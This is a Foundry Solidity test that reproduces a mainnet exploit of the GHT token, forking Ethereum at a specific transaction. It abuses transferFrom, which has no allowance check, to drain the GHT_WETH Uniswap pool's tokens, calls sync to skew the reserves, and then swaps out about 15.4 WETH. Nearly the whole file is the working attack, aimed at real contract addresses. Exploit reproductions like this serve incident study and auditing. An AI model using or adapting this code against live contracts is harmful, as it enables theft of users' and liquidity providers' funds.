// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

interface IGHT {
    function transferFrom(address, address, uint256) external;

    function balanceOf(address) external view returns (uint256);
}

WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IGHT constant GHT = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
IUniswapV2Pair constant GHT_WETH_Pool = IUniswapV2Pair(
    0x706206EabD6A70ca4992eEc1646B6D1599259CAe
);

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork(
            "mainnet",
            bytes32(
                0xd17266bcdf30cbcbd7d0b5a006f43141981aeee2e1f860f68c9a1805ecacbc68
            )
        );
        // vm.createSelectFork("mainnet", 19380954);
        vm.label(address(WETH), "WETH");
        vm.label(address(GHT), "GHT");
        vm.label(address(GHT_WETH_Pool), "GHT_WETH_Pool");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("WETH balance before attack", WETH.balanceOf(address(this)), 18);

        // GHT_WETH_Pool's GHT
        uint256 amount = GHT.balanceOf(address(GHT_WETH_Pool));
        GHT.transferFrom(address(GHT_WETH_Pool), address(GHT), amount - 1);
        GHT_WETH_Pool.sync();

        GHT.transferFrom(
            address(GHT),
            address(GHT_WETH_Pool),
            GHT.balanceOf(address(GHT))
        );
        // uint256 balance = GHT.balanceOf(address(GHT_WETH_Pool));
        (, uint256 r1, ) = GHT_WETH_Pool.getReserves();
        // print("r0", r0, 18);
        // print("r1", r1, 18);
        // r0: 0.000000000000000001
        // r1: 15.438613861386138611

        GHT_WETH_Pool.swap(0, r1 - 1, address(this), "");

        print("WETH balance after", WETH.balanceOf(address(this)), 18);
    }
}
